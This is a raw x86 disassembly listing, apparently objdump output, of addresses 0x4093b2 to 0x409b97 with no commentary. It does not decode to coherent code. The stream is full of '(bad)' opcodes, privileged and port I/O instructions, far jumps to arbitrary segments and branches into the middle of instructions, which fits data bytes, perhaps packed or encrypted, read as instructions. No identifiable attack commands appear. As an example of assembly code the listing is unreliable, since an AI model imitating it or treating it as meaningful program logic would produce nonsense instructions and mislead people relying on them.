  4093b2:	jmp    0x3a76:0x12e1eeb3
  4093b9:	adc    ebx,DWORD PTR [esi+ecx*2-0x40]
  4093bd:	cmp    edx,DWORD PTR [esi]
  4093bf:	xchg   edi,eax
  4093c0:	mov    ebx,edi
  4093c2:	in     al,dx
  4093c3:	ret    
  4093c4:	enter  0x3b9c,0xf6
  4093c8:	daa    
  4093c9:	test   eax,0x59344a8d
  4093ce:	mul    DWORD PTR cs:[esi]
  4093d1:	jae    0x409384
  4093d3:	jmp    0x4093a0
  4093d5:	test   DWORD PTR es:[esi+0x64],eax
  4093d9:	jo     0x4093bc
  4093db:	or     al,0x5a
  4093dd:	mov    ebp,0x4062e440
  4093e2:	icebp  
  4093e3:	xor    ebx,eax
  4093e5:	ss and ecx,ebx
  4093e8:	inc    ebp
  4093e9:	add    bl,bh
  4093eb:	shr    cl,1
  4093ed:	les    edi,FWORD PTR [eax]
  4093ef:	repnz inc ebx
  4093f1:	into   
  4093f2:	jp     0x4093f6
  4093f4:	push   eax
  4093f5:	cmp    DWORD PTR [ebp-0x1ae6b714],edx
  4093fb:	sub    al,0xb9
  4093fd:	dec    esp
  4093fe:	pop    ss
  4093ff:	ret    
  409400:	fs aad 0x4a
  409403:	das    
  409404:	dec    edx
  409405:	sub    edi,DWORD PTR [ebx-0x3d0e04ce]
  40940b:	sub    bl,BYTE PTR [edx+eax*2+0x53]
  40940f:	xlat   BYTE PTR ds:[ebx]
  409410:	imul   esp,DWORD PTR [edi+ebx*2+0x7],0x88aafd67
  409418:	ret    0xb5c4
  40941b:	pop    ebp
  40941c:	or     cl,dl
  40941e:	sub    DWORD PTR ss:[eax-0x496582b3],ebp
  409425:	jbe    0x4093bb
  409427:	imul   ebx,DWORD PTR [ecx+0x73],0x19
  40942b:	cli    
  40942c:	add    al,0x1f
  40942e:	jmp    0xfb7:0xa92146af
  409435:	or     bh,BYTE PTR [ebx-0x2cd12951]
  40943b:	mov    bl,BYTE PTR [esi]
  40943d:	int    0x88
  40943f:	mov    DWORD PTR ds:0x6160e07f,esp
  409445:	(bad)  
  409446:	mov    esp,0xb0538843
  40944b:	jnp    0x4094bc
  40944d:	loop   0x409417
  40944f:	call   edi
  409451:	xchg   ebp,eax
  409452:	xor    esp,ebx
  409454:	fwait
  409455:	mov    edi,0x1291d2a6
  40945a:	pop    ebp
  40945b:	rcr    BYTE PTR [eax+0x1b73e080],1
  409461:	push   ecx
  409462:	jmp    0x409430
  409464:	xor    BYTE PTR [edx-0x3561b66c],0xa7
  40946b:	or     ebx,ebp
  40946d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40946e:	and    ebx,eax
  409470:	stos   BYTE PTR es:[edi],al
  409471:	aaa    
  409472:	shl    DWORD PTR [edx-0x1d303f08],1
  409478:	push   0xffffff9d
  40947a:	rol    DWORD PTR [ecx-0x68],cl
  40947d:	pushf  
  40947e:	jae    0x4094d3
  409480:	adc    al,0x61
  409482:	je     0x409474
  409484:	outs   dx,BYTE PTR ds:[esi]
  409485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409486:	hlt    
  409487:	mov    cl,0x6f
  409489:	jle    0x4094c1
  40948b:	out    0xe8,eax
  40948d:	mov    esi,0x8c476ea6
  409492:	add    DWORD PTR [ebx],0x8c1db42d
  409498:	fs test al,0x91
  40949b:	push   edx
  40949c:	inc    edi
  40949d:	ret    
  40949e:	leave  
  40949f:	lods   al,BYTE PTR ds:[esi]
  4094a0:	jmp    0xd8cef7ce
  4094a5:	test   al,0xae
  4094a7:	in     al,0x6b
  4094a9:	cwde   
  4094aa:	jmp    0x547d:0x1d674b42
  4094b1:	jno    0x4094e6
  4094b3:	xlat   BYTE PTR ds:[ebx]
  4094b4:	push   esi
  4094b5:	inc    eax
  4094b6:	call   0x9f5995d5
  4094bb:	dec    ebx
  4094bc:	sti    
  4094bd:	sub    edi,DWORD PTR [edx-0x6f]
  4094c0:	push   esp
  4094c1:	push   ds
  4094c2:	add    edi,DWORD PTR [ecx-0xf]
  4094c5:	mov    ebx,DWORD PTR [ecx-0x7faf022b]
  4094cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094cc:	or     eax,0x9cead65a
  4094d1:	and    al,0x81
  4094d3:	pop    edi
  4094d4:	xchg   edi,eax
  4094d5:	jp     0x409483
  4094d7:	sbb    al,0xdf
  4094d9:	enter  0x648d,0x18
  4094dd:	add    ebp,DWORD PTR [eax+ebp*2-0x21]
  4094e1:	fimul  WORD PTR [ebx-0x584bf5a1]
  4094e7:	xchg   esp,eax
  4094e8:	jae    0x409531
  4094ea:	ds cld 
  4094ec:	mov    eax,0xc1fcca8d
  4094f1:	shl    DWORD PTR [edx],0x8b
  4094f4:	rcr    ecx,cl
  4094f6:	aam    0x7b
  4094f8:	add    esi,DWORD PTR cs:[esi]
  4094fb:	sub    al,0x3e
  4094fd:	fdivr  st,st(7)
  4094ff:	pop    esi
  409500:	(bad)  
  409501:	gs push ecx
  409503:	outs   dx,BYTE PTR ds:[esi]
  409504:	dec    esi
  409505:	aaa    
  409506:	dec    edi
  409507:	adc    BYTE PTR [edi],0xf7
  40950a:	xchg   BYTE PTR [ebx+0x17f8745],dl
  409510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409511:	aam    0xdc
  409513:	cmp    ah,cl
  409515:	(bad)  
  409516:	outs   dx,BYTE PTR ds:[esi]
  409517:	shr    BYTE PTR [ebx-0x56b8bb4e],0x6
  40951e:	cmp    dl,BYTE PTR ds:0x78494744
  409524:	sbb    BYTE PTR [edx+ecx*4],bh
  409527:	inc    edi
  409528:	es aas 
  40952a:	fwait
  40952b:	loop   0x4094b8
  40952d:	push   edi
  40952e:	ret    0x1ce6
  409531:	nop
  409532:	adc    ah,cl
  409534:	sahf   
  409535:	shl    DWORD PTR [edx],cl
  409537:	int    0x64
  409539:	shl    DWORD PTR [eax-0x11126b58],1
  40953f:	test   eax,0x682ad29d
  409544:	mov    ch,0xd2
  409546:	adc    eax,0x7c40f812
  40954b:	cmp    al,0x4d
  40954d:	jp     0x40955c
  40954f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409550:	cmp    edi,DWORD PTR [ecx-0x346ce8ad]
  409556:	daa    
  409557:	scas   eax,DWORD PTR es:[edi]
  409558:	std    
  409559:	jle    0x409586
  40955b:	fwait
  40955c:	in     eax,dx
  40955d:	mov    ds:0x5b164fd7,al
  409562:	xor    bl,BYTE PTR [eax+0x171f294]
  409568:	and    DWORD PTR [ebp-0x7dd345ca],ebx
  40956e:	jae    0x40958c
  409570:	dec    edx
  409571:	sbb    eax,0x4cf2305b
  409576:	mov    ebp,0xf1099d95
  40957b:	mov    edi,0x6167cc4d
  409580:	les    edi,FWORD PTR [edx-0x66]
  409583:	inc    ecx
  409584:	inc    ecx
  409585:	xlat   BYTE PTR ds:[ebx]
  409586:	daa    
  409587:	sub    BYTE PTR [ebp-0x57c1f030],ch
  40958d:	jmp    0xe8fd649
  409592:	out    0xfd,eax
  409594:	retf   
  409595:	sub    ebx,ebx
  409597:	push   esp
  409598:	dec    eax
  409599:	pop    es
  40959a:	push   0x28d39ec9
  40959f:	jecxz  0x409596
  4095a1:	or     al,0x7b
  4095a3:	popf   
  4095a4:	loop   0x40961c
  4095a6:	lea    edx,[edx]
  4095a8:	jle    0x4095bc
  4095aa:	cmp    eax,esi
  4095ac:	jb     0x409593
  4095ae:	adc    ah,dh
  4095b0:	push   0xffffff9c
  4095b2:	fistp  WORD PTR [esi+eiz*4-0x32]
  4095b6:	xchg   edi,eax
  4095b7:	mov    bl,al
  4095b9:	cwde   
  4095ba:	pop    esi
  4095bb:	aas    
  4095bc:	or     al,0x4d
  4095be:	mov    esp,0xbb7623d8
  4095c3:	aam    0x10
  4095c5:	push   ss
  4095c6:	pop    ecx
  4095c7:	cli    
  4095c8:	jecxz  0x409585
  4095ca:	outs   dx,DWORD PTR ds:[esi]
  4095cb:	mov    eax,0x7f4795da
  4095d0:	xchg   BYTE PTR [ebx+ebp*2],bh
  4095d3:	xchg   BYTE PTR [edx+0x5b],bl
  4095d6:	dec    esp
  4095d7:	outs   dx,DWORD PTR ds:[esi]
  4095d8:	arpl   WORD PTR [edi+edx*1+0x6b377774],si
  4095df:	xlat   BYTE PTR ds:[ebx]
  4095e0:	call   0xac39b333
  4095e5:	arpl   WORD PTR [ecx+0x5d],dx
  4095e8:	test   eax,0x6b9b8e7d
  4095ed:	mov    esp,0xef61d68e
  4095f2:	pop    ds
  4095f3:	ffree  st(2)
  4095f5:	mov    ecx,ecx
  4095f7:	xchg   edx,eax
  4095f8:	nop
  4095f9:	lahf   
  4095fa:	enter  0xff6,0x69
  4095fe:	test   DWORD PTR [esi+0x58],ebp
  409601:	std    
  409602:	add    al,0x90
  409604:	mov    DWORD PTR [edx+0x3220435c],edi
  40960a:	enter  0x3fbf,0xcd
  40960e:	stos   DWORD PTR es:[edi],eax
  40960f:	and    ebx,edx
  409611:	inc    ecx
  409612:	call   0x7d49:0x17e50bef
  409619:	and    al,0x45
  40961b:	dec    eax
  40961c:	(bad)  
  40961d:	clc    
  40961e:	ret    
  40961f:	call   DWORD PTR [ebp+eax*1+0x6b]
  409623:	lods   eax,DWORD PTR ds:[esi]
  409624:	gs push 0x1eefe192
  40962a:	or     al,BYTE PTR [edx]
  40962c:	cmp    cl,ah
  40962e:	fst    DWORD PTR [esi+0x53ab68e8]
  409634:	sbb    edx,DWORD PTR [eax-0x5a6a5d5e]
  40963a:	(bad)  
  40963b:	mov    BYTE PTR [edi+0x7],bl
  40963e:	sub    ebx,edi
  409640:	ret    
  409641:	or     eax,0xc10d0b87
  409646:	xor    eax,0x1b90c625
  40964b:	jl     0x409605
  40964d:	stos   DWORD PTR es:[edi],eax
  40964e:	jmp    0x5076b1e6
  409653:	mov    eax,0x1de39e8c
  409658:	jb     0x40966e
  40965a:	scas   al,BYTE PTR es:[edi]
  40965b:	icebp  
  40965c:	mov    al,0x6d
  40965e:	xchg   ebp,eax
  40965f:	xor    bl,ch
  409661:	pop    edi
  409662:	adc    DWORD PTR [eax+0x4e07fb54],edi
  409668:	mov    al,ds:0xd1fddc02
  40966d:	gs ret 
  40966f:	xor    eax,DWORD PTR [eax]
  409671:	push   cs
  409672:	push   ss
  409673:	fistp  WORD PTR ds:0xdd5c188a
  409679:	sbb    DWORD PTR [eax-0x43],0x70725432
  409680:	add    eax,0xb0ea1117
  409685:	sahf   
  409686:	call   0x2fba:0x89c511e3
  40968d:	stos   BYTE PTR es:[edi],al
  40968e:	mov    DWORD PTR [esi],edx
  409690:	jo     0x4096b8
  409692:	sub    bh,BYTE PTR [eax+0x3]
  409695:	(bad)  
  409696:	jmp    0xdbe8124d
  40969b:	jmp    0x40971a
  40969d:	push   cs
  40969e:	and    ebx,DWORD PTR [ecx+ebx*2-0x39]
  4096a2:	xchg   ebx,eax
  4096a3:	(bad)  
  4096a4:	(bad)  
  4096a5:	in     eax,dx
  4096a6:	cmp    al,0xf9
  4096a8:	mov    ebx,0xc955937a
  4096ad:	dec    eax
  4096ae:	push   edx
  4096af:	cmpxchg DWORD PTR [eax+esi*8+0xe],edi
  4096b4:	jb     0x4096f0
  4096b6:	mov    al,ds:0x93e050a0
  4096bb:	(bad)  
  4096bc:	push   ebx
  4096bd:	call   0x2df7aed2
  4096c2:	jl     0x4096f3
  4096c4:	push   edx
  4096c5:	sub    cl,BYTE PTR [eax]
  4096c7:	mov    ebx,DWORD PTR [ebx+0xeb995bc]
  4096cd:	push   ds
  4096ce:	nop
  4096cf:	xchg   edi,eax
  4096d0:	xchg   ebx,eax
  4096d1:	div    BYTE PTR [ebp+0x4207d98e]
  4096d7:	in     al,0x5a
  4096d9:	mov    edi,DWORD PTR [ebx-0x65]
  4096dc:	loopne 0x4096c1
  4096de:	jne    0x4096ed
  4096e0:	outs   dx,DWORD PTR ds:[esi]
  4096e1:	jle    0x409722
  4096e3:	vpor   xmm7,xmm6,XMMWORD PTR [esi+ebp*8]
  4096e8:	dec    eax
  4096e9:	(bad)  
  4096eb:	add    eax,0x52573f14
  4096f0:	adc    BYTE PTR [ebp-0x373a952],cl
  4096f6:	(bad)  
  4096f8:	cdq    
  4096f9:	shr    DWORD PTR [ebx],0x99
  4096fc:	in     al,dx
  4096fd:	lock or bh,dh
  409700:	inc    ebx
  409701:	xlat   BYTE PTR ds:[ebx]
  409702:	sahf   
  409703:	mov    ds:0x99806704,al
  409708:	gs repz std 
  40970b:	mov    dh,0xc
  40970d:	add    cl,0xc6
  409710:	sub    DWORD PTR [ecx-0x8],ebp
  409713:	mov    al,0x59
  409715:	sahf   
  409716:	or     BYTE PTR [edi-0x2c],ah
  409719:	imul   edx,DWORD PTR cs:[esi-0x46],0xffffffa1
  40971e:	stos   BYTE PTR es:[edi],al
  40971f:	inc    esi
  409720:	fnstsw WORD PTR [edx-0x7455a907]
  409726:	neg    BYTE PTR [edx-0x2d]
  409729:	pop    esp
  40972a:	ins    BYTE PTR es:[edi],dx
  40972b:	outs   dx,BYTE PTR ds:[esi]
  40972c:	mov    ebp,esp
  40972e:	mov    al,0x3a
  409730:	dec    eax
  409731:	mov    bh,0x24
  409733:	mov    ecx,0xb898df39
  409738:	es cmp al,0x32
  40973b:	dec    ebx
  40973c:	mov    WORD PTR [esi],fs
  40973e:	js     0x409707
  409740:	dec    esp
  409741:	ds sti 
  409743:	outs   dx,BYTE PTR ss:[esi]
  409745:	mov    esi,0x8b6761d5
  40974a:	(bad)  
  40974b:	out    dx,eax
  40974c:	jle    0x409795
  40974e:	jg     0x4096eb
  409750:	cmp    bl,ah
  409752:	xchg   esi,eax
  409753:	cmp    eax,edi
  409755:	lods   eax,DWORD PTR ds:[esi]
  409756:	push   ds
  409757:	xchg   ebx,eax
  409758:	(bad)  
  409759:	mov    ecx,edx
  40975b:	add    ebx,DWORD PTR [edx-0x41d813fd]
  409761:	jge    0x92bc2dec
  409767:	popf   
  409768:	jo     0x409719
  40976a:	ja     0x4097b6
  40976c:	std    
  40976d:	cld    
  40976e:	and    cl,BYTE PTR [edi-0x4622620]
  409774:	cmp    eax,0x293e1802
  409779:	or     eax,0x50c0c215
  40977e:	xchg   ebp,eax
  40977f:	outs   dx,BYTE PTR ds:[esi]
  409780:	adc    ecx,DWORD PTR [ecx+0x776113fd]
  409786:	adc    eax,DWORD PTR [ebp+0x7c]
  409789:	ds popa 
  40978b:	mov    ebx,0xfaf9cd4d
  409790:	inc    esp
  409791:	cli    
  409792:	inc    edi
  409793:	ins    BYTE PTR es:[edi],dx
  409794:	pop    eax
  409795:	pop    ecx
  409796:	cmp    DWORD PTR [edi-0x16bb4b56],eax
  40979c:	aaa    
  40979d:	imul   esp,DWORD PTR [ecx-0x226c3aa8],0x7e
  4097a4:	mov    edi,0xdbd10b45
  4097a9:	shl    edx,1
  4097ab:	and    al,0xb3
  4097ad:	icebp  
  4097ae:	add    eax,0x2058ecfe
  4097b3:	or     eax,DWORD PTR [ecx+0x55bed365]
  4097b9:	mov    al,0x41
  4097bb:	ins    BYTE PTR es:[edi],dx
  4097bc:	arpl   WORD PTR [ecx],di
  4097be:	push   0xffffffd7
  4097c0:	outs   dx,BYTE PTR ds:[esi]
  4097c1:	out    dx,ax
  4097c3:	dec    edi
  4097c4:	in     al,dx
  4097c5:	dec    ebx
  4097c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097c7:	setnp  cl
  4097ca:	adc    al,0x21
  4097cc:	mov    ds:0x8f611f32,al
  4097d1:	dec    edi
  4097d2:	xchg   al,al
  4097d4:	call   0xc57b:0x7261b8b
  4097db:	sti    
  4097dc:	dec    esp
  4097dd:	sub    DWORD PTR [esi],ecx
  4097df:	jns    0x4097cb
  4097e1:	icebp  
  4097e2:	adc    dh,BYTE PTR [eax]
  4097e4:	hlt    
  4097e5:	cmc    
  4097e6:	outs   dx,DWORD PTR ds:[esi]
  4097e7:	cmp    eax,0xd7c84b1f
  4097ec:	jo     0x4097cc
  4097ee:	adc    DWORD PTR [ecx],eax
  4097f0:	lock (bad) [edx-0x73ad42bc]
  4097f7:	mov    al,0x5c
  4097f9:	jg     0x409877
  4097fb:	lods   al,BYTE PTR ds:[esi]
  4097fc:	fsub   QWORD PTR [edx]
  4097fe:	sbb    eax,0x244a1314
  409803:	(bad)  
  409804:	(bad)  
  409807:	pop    ecx
  409808:	imul   eax,DWORD PTR [ebp+0x68],0x5239ccb2
  40980f:	addr16 dec ebx
  409811:	popf   
  409812:	push   cs
  409813:	ins    DWORD PTR es:[edi],dx
  409814:	pusha  
  409815:	outs   dx,BYTE PTR ds:[esi]
  409816:	or     DWORD PTR [esp+ebx*1],0xffffffd9
  40981a:	or     BYTE PTR [edx+0x62326858],dl
  409820:	sub    eax,0x7f0876fb
  409825:	mov    WORD PTR [eax-0xc],cs
  409828:	icebp  
  409829:	jp     0x4097e5
  40982b:	mov    edi,0x85b0fc9
  409830:	(bad)  
  409831:	mov    al,0x8c
  409833:	inc    esi
  409834:	cs inc ebx
  409836:	xchg   esp,eax
  409837:	sar    DWORD PTR [ebp+0x58],1
  40983a:	add    eax,0xed79839c
  40983f:	ret    
  409840:	xlat   BYTE PTR ds:[ebx]
  409841:	aaa    
  409842:	aad    0xe8
  409844:	nop
  409845:	das    
  409846:	and    DWORD PTR [edi],ecx
  409848:	aad    0xce
  40984a:	mov    ah,0xb3
  40984c:	mov    edx,0x638299b1
  409851:	adc    ebx,ebp
  409853:	(bad)  
  409854:	clc    
  409855:	inc    edx
  409856:	lock mov ecx,0xb3cfa1c0
  40985c:	xlat   BYTE PTR fs:[ebx]
  40985e:	gs inc eax
  409860:	retf   
  409861:	adc    dh,BYTE PTR [ecx+ebp*4+0x1ce762ab]
  409868:	(bad)  
  409869:	rol    DWORD PTR [edi+ebp*2],1
  40986c:	or     ch,BYTE PTR [eax+0x41]
  40986f:	sub    DWORD PTR [edx],ebx
  409871:	ss mov bh,0x87
  409874:	or     eax,0xc9929fcb
  409879:	test   al,0xcb
  40987b:	aad    0x22
  40987d:	pusha  
  40987e:	call   DWORD PTR [esi-0x1338ac63]
  409884:	pop    edi
  409885:	inc    sp
  409887:	into   
  409888:	cmp    al,0xae
  40988a:	scas   al,BYTE PTR es:[edi]
  40988b:	call   DWORD PTR [esi+0x3c]
  40988e:	outs   dx,BYTE PTR ds:[esi]
  40988f:	pushf  
  409890:	adc    BYTE PTR [edx],bh
  409892:	mov    al,ds:0xd0b77edf
  409897:	mov    esp,0x196f68e8
  40989c:	std    
  40989d:	jecxz  0x4098d9
  40989f:	rcl    BYTE PTR [ebx-0x4080496],0x49
  4098a6:	xor    bl,BYTE PTR [edi]
  4098a8:	cdq    
  4098a9:	lea    edx,[ebx+0x2b]
  4098ac:	bound  ecx,QWORD PTR [ebx]
  4098ae:	fcomp  QWORD PTR [edx+ebp*8]
  4098b1:	ror    DWORD PTR [ebx-0x794bc606],0x2d
  4098b8:	add    eax,0x7062d2e8
  4098bd:	jecxz  0x409863
  4098bf:	sub    BYTE PTR [ecx-0x7a4779a1],0x71
  4098c6:	icebp  
  4098c7:	out    0x89,al
  4098c9:	push   esi
  4098ca:	sbb    eax,0xeb6e5cbf
  4098cf:	pop    eax
  4098d0:	fild   QWORD PTR [esi-0x5a]
  4098d3:	mov    DWORD PTR [eax-0x2f],esp
  4098d6:	(bad)  
  4098d7:	jne    0x409924
  4098d9:	jnp    0x40993f
  4098db:	test   al,0xbb
  4098dd:	fisubr DWORD PTR [eax+0x1a]
  4098e0:	mov    ah,0xbe
  4098e2:	dec    esi
  4098e3:	dec    ebx
  4098e5:	dec    BYTE PTR [eax+0x681cc614]
  4098eb:	xchg   esi,eax
  4098ec:	out    dx,eax
  4098ed:	push   ebp
  4098ee:	jb     0x409901
  4098f0:	lahf   
  4098f1:	or     al,ch
  4098f3:	(bad)  
  4098f4:	int3   
  4098f5:	jne    0x40992e
  4098f7:	mov    ebp,0xefe896b4
  4098fc:	push   esi
  4098fd:	mov    cl,0x19
  4098ff:	cmp    eax,0x64609bc7
  409904:	push   ecx
  409905:	cmp    eax,0xe038e2b7
  40990a:	ret    
  40990b:	mov    cl,0x94
  40990d:	enter  0x7879,0xad
  409911:	cwde   
  409912:	lods   al,BYTE PTR ds:[esi]
  409913:	jo     0x409962
  409915:	stos   BYTE PTR es:[edi],al
  409916:	dec    edi
  409917:	out    dx,eax
  409918:	rcl    DWORD PTR [ebp+ebx*4-0x58450983],0x22
  409920:	sub    DWORD PTR [eax],ebx
  409922:	or     al,0x7c
  409924:	pushf  
  409925:	mov    bh,0x8b
  409927:	cmp    BYTE PTR [ebp-0x64837fa5],bl
  40992d:	pop    ecx
  40992e:	jnp    0x40996b
  409930:	imul   edi,DWORD PTR [esi+0x4a],0xb
  409934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409935:	sbb    eax,0xbf64751d
  40993a:	dec    edx
  40993b:	out    0x30,al
  40993d:	(bad)  
  40993e:	cs sbb eax,0xe8669a54
  409944:	inc    edi
  409945:	stc    
  409946:	mov    eax,0x1f49eed7
  40994b:	or     edi,DWORD PTR [ebp-0x62c8bc3c]
  409951:	ror    dh,1
  409953:	mov    ebp,DWORD PTR [edi+0x47]
  409956:	and    esi,DWORD PTR [ecx+0x3ee5ebd]
  40995c:	cmp    al,0x72
  40995e:	or     DWORD PTR [ecx-0xd9a8a6c],0xffffffd4
  409965:	mov    edx,0xe335b114
  40996a:	repnz add BYTE PTR [edi-0x10],al
  40996e:	sbb    cl,BYTE PTR [eax]
  409970:	je     0x4099e2
  409972:	mov    esp,0x7c703730
  409977:	xlat   BYTE PTR ds:[ebx]
  409978:	pusha  
  409979:	sbb    al,0x1c
  40997b:	call   0xe4d0e4fd
  409980:	inc    eax
  409981:	adc    bh,BYTE PTR [edx]
  409983:	pushf  
  409984:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409985:	dec    esi
  409986:	shl    BYTE PTR ds:0x337fed1c,cl
  40998c:	add    cl,bl
  40998e:	fldlg2 
  409990:	enter  0x51df,0x10
  409994:	and    bl,BYTE PTR [esp+eax*4-0x26]
  409998:	xchg   ebp,eax
  409999:	aaa    
  40999a:	test   BYTE PTR [ebx+0x6c],0x82
  40999e:	aad    0xf
  4099a0:	stos   BYTE PTR es:[edi],al
  4099a1:	inc    ecx
  4099a2:	sbb    eax,0xa02385c3
  4099a7:	hlt    
  4099a8:	mov    eax,0x42645aa6
  4099ae:	daa    
  4099af:	fdivr  DWORD PTR [ebx-0x6bdb123]
  4099b5:	icebp  
  4099b6:	pushf  
  4099b7:	dec    ebx
  4099b8:	add    esp,DWORD PTR [edi]
  4099ba:	stc    
  4099bb:	mov    bh,BYTE PTR [ebp+0x29]
  4099be:	or     DWORD PTR [eax],esp
  4099c0:	or     DWORD PTR [ebx-0x712dbc01],esi
  4099c6:	sbb    DWORD PTR [edi-0x5],esi
  4099c9:	out    0xb2,al
  4099cb:	add    BYTE PTR [edi-0xb],dl
  4099ce:	cmp    DWORD PTR [ecx+0x23],esi
  4099d1:	mov    es,eax
  4099d3:	pop    ebp
  4099d4:	shl    esi,cl
  4099d6:	cld    
  4099d7:	mov    bh,BYTE PTR [ecx+0x36]
  4099da:	fwait
  4099db:	daa    
  4099dc:	imul   edi,ebp,0x7c
  4099df:	xchg   ebp,eax
  4099e0:	jne    0x4099ee
  4099e2:	adc    al,0xe8
  4099e4:	adc    eax,0xab237efd
  4099e9:	mov    edx,0xbbd7b4a5
  4099ee:	inc    edx
  4099ef:	mov    dl,0x6f
  4099f1:	mov    edx,0x429ce435
  4099f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099f7:	mov    bl,0x67
  4099f9:	into   
  4099fa:	xor    DWORD PTR [edi+0x32575e78],ebx
  409a00:	xchg   BYTE PTR [eax-0x367ea4fa],al
  409a06:	hlt    
  409a07:	push   edx
  409a08:	jge    0x4099eb
  409a0a:	fsubr  DWORD PTR [eax-0x18]
  409a0d:	test   dh,bh
  409a0f:	cmp    eax,0x91cdcc09
  409a14:	xchg   ebx,eax
  409a15:	jnp    0x4099e3
  409a17:	dec    esi
  409a18:	lock push es
  409a1a:	mov    eax,ds:0xa044115c
  409a1f:	adc    al,0x9c
  409a21:	ror    DWORD PTR [ebx+0x34152abd],cl
  409a27:	jns    0x4099ff
  409a29:	push   eax
  409a2a:	push   0xbf37d91f
  409a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a30:	and    edx,edx
  409a32:	(bad)  
  409a34:	jg     0x409a1f
  409a36:	outs   dx,DWORD PTR ds:[esi]
  409a37:	std    
  409a38:	das    
  409a39:	xchg   ebp,eax
  409a3a:	xor    BYTE PTR [ebx+0x9],ah
  409a3d:	push   ds
  409a3e:	push   edx
  409a3f:	push   ds
  409a40:	jp     0x409a70
  409a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a43:	push   edi
  409a44:	xor    BYTE PTR [edi+0x5b684adb],0x14
  409a4b:	in     eax,0xa4
  409a4d:	data16 (bad) 
  409a4f:	or     eax,0x65bec427
  409a54:	loop   0x409a1d
  409a56:	ret    
  409a57:	push   esp
  409a58:	mov    al,ds:0x48ea4a5c
  409a5d:	cmc    
  409a5e:	sub    DWORD PTR [ebx+0x3535e49b],0xffffff92
  409a65:	clts   
  409a67:	loopne 0x409ac7
  409a69:	fst    QWORD PTR cs:[edi+0x363a6c26]
  409a70:	in     al,0x7d
  409a72:	jp     0x409a2b
  409a74:	(bad)  
  409a75:	cli    
  409a76:	fistp  QWORD PTR [eax*8-0x14ed76c5]
  409a7d:	out    0x3b,eax
  409a7f:	ins    DWORD PTR es:[edi],dx
  409a80:	push   ebx
  409a81:	ret    
  409a82:	shl    BYTE PTR [esi+edi*2+0xd],0xe7
  409a87:	aam    0x17
  409a89:	jns    0x409a40
  409a8b:	out    0x93,al
  409a8d:	xchg   edi,eax
  409a8e:	pop    ss
  409a8f:	sub    DWORD PTR [ebx+0x4b7b3235],edx
  409a95:	xchg   BYTE PTR [ebx+0x660e5bad],cl
  409a9b:	call   0x9381:0x698ca813
  409aa2:	mov    ch,BYTE PTR [ebp+0x79eb3eeb]
  409aa8:	mov    dl,0x40
  409aaa:	fisttp QWORD PTR gs:[ecx]
  409aad:	lods   al,BYTE PTR ds:[esi]
  409aae:	idiv   ebx
  409ab0:	or     DWORD PTR [edi-0x60],ebx
  409ab3:	inc    edi
  409ab4:	js     0x409ab3
  409ab6:	leave  
  409ab7:	add    BYTE PTR [ecx+ebx*8-0x1aa9b91b],dl
  409abe:	aad    0xd4
  409ac0:	or     al,0x54
  409ac2:	scas   eax,DWORD PTR es:[edi]
  409ac3:	imul   esi,ebx,0x37
  409ac6:	mov    esp,DWORD PTR [ebx-0x4b]
  409ac9:	inc    ecx
  409aca:	mov    bh,0x22
  409acc:	adc    ebx,ebp
  409ace:	ins    DWORD PTR es:[edi],dx
  409acf:	sbb    DWORD PTR [ebp+0x1cbd53f0],eax
  409ad5:	shl    bh,0x87
  409ad8:	mov    ds:0xf8582941,eax
  409add:	rol    BYTE PTR [ebx+eiz*2-0x715fbd83],1
  409ae4:	jmp    0xac20:0xd46029b4
  409aeb:	inc    ebp
  409aec:	imul   esp,DWORD PTR [eax],0x3f
  409aef:	sbb    ebp,DWORD PTR [edi+0x4e]
  409af2:	lahf   
  409af3:	cs jg  0x409aec
  409af6:	add    dh,ch
  409af8:	pusha  
  409af9:	seto   al
  409afc:	out    dx,eax
  409afd:	icebp  
  409afe:	cmp    BYTE PTR [esi],cl
  409b00:	mov    ds:0xc2370373,al
  409b05:	or     eax,0x2e97141c
  409b0a:	mov    dl,0x33
  409b0c:	xchg   edx,eax
  409b0d:	imul   eax,DWORD PTR [eax-0x1a],0xffffff8e
  409b11:	jge    0x409b7f
  409b13:	je     0x409b2b
  409b15:	mov    ebp,0x47ea4c21
  409b1a:	mov    ecx,0x8fe6508a
  409b1f:	fs push esi
  409b21:	pop    ds
  409b22:	cmp    BYTE PTR [edi],bh
  409b24:	pop    ds
  409b25:	enter  0x9ee0,0xca
  409b29:	pop    ecx
  409b2a:	jne    0x409aac
  409b2c:	or     edi,0xffffffec
  409b2f:	push   0xffffffd6
  409b31:	bound  ecx,QWORD PTR [ebp+0x6222336e]
  409b37:	cs push eax
  409b39:	push   ebx
  409b3a:	push   ss
  409b3b:	sbb    al,0xd7
  409b3d:	sub    eax,esi
  409b3f:	int    0x79
  409b41:	div    DWORD PTR [esi-0x25]
  409b44:	fldenv [edx]
  409b46:	scas   al,BYTE PTR es:[edi]
  409b47:	sbb    al,0x10
  409b49:	push   edi
  409b4a:	push   0xca1ca029
  409b4f:	retf   
  409b50:	dec    edi
  409b51:	sbb    BYTE PTR es:[esi+0x1b],ah
  409b55:	cmp    esp,DWORD PTR [ebp+ebp*2-0x5500766d]
  409b5c:	pop    ebx
  409b5d:	jge    0x409baf
  409b5f:	fwait
  409b60:	stc    
  409b61:	fimul  WORD PTR [ebp+0x42]
  409b64:	or     eax,0x50357d8c
  409b69:	pop    esi
  409b6a:	int3   
  409b6b:	test   DWORD PTR [ebp-0x456ee7d0],esi
  409b71:	in     eax,dx
  409b72:	std    
  409b73:	std    
  409b74:	inc    ebx
  409b75:	adc    esi,DWORD PTR [eax]
  409b77:	sbb    esi,DWORD PTR [edx+0x31]
  409b7a:	repnz adc DWORD PTR [esi-0x1f24a81d],0x1a
  409b82:	ud1    ecx,DWORD PTR [edx+0x247413c3]
  409b89:	and    ah,dl
  409b8b:	jo     0x409b77
  409b8d:	test   DWORD PTR [eax-0x3fd2054c],esi
  409b93:	iret   
  409b94:	movd   mm7,esi
  409b97:	lock loop 0x409b3f
